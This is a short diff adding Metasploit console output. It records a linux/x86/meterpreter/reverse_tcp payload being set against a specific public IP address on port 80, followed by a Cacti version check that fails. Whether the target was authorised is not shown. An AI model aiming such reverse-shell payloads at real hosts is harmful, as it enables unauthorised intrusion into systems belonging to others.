@@ -1,0 +1,6 @@
+This copy of metasploit-framework is more than two weeks old.
+ Consider running 'msfupdate' to update to the latest version.
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+RHOSTS => 202.169.33.63
+RPORT => 80
+[*] 202.169.33.63:80 - The service is running, but could not be validated. Could not determine the Cacti version: the HTTP response body did not match the expected format.
